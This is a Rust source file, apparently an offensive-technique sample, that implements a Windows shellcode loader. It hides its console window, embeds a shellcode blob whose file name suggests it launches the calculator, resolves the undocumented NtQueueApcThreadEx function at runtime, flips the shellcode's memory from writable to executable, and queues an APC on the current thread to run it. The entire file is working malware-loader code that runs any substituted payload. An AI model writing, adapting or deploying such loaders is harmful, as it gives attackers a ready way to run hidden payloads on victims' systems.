#![windows_subsystem = "windows"]

use std::ffi::c_void;
use std::mem::transmute;
use std::ptr::{copy, null};
use windows_sys::Win32::Foundation::{FALSE, HANDLE};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::GetCurrentThread;

const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
const SIZE: usize = SHELLCODE.len();

#[cfg(target_os = "windows")]
fn main() {
    let mut old = PAGE_READWRITE;

    unsafe {
        let ntdll = LoadLibraryA("ntdll.dll\0".as_ptr());

        let fn_nt_queue_apc_thread_ex = GetProcAddress(ntdll, "NtQueueApcThreadEx\0".as_ptr());

        let nt_queue_apc_thread_ex: extern "C" fn(HANDLE, isize, *mut c_void, isize, isize, isize) =
            transmute(fn_nt_queue_apc_thread_ex);

        let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if dest.is_null() {
            eprintln!("VirtualAlloc failed!");
            return;
        }

        copy(SHELLCODE.as_ptr(), dest.cast(), SIZE);

        let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            eprintln!("VirtualProtect failed!");
            return;
        }

        let handle = GetCurrentThread();

        nt_queue_apc_thread_ex(handle, 1, dest, 0, 0, 0);
    }
}
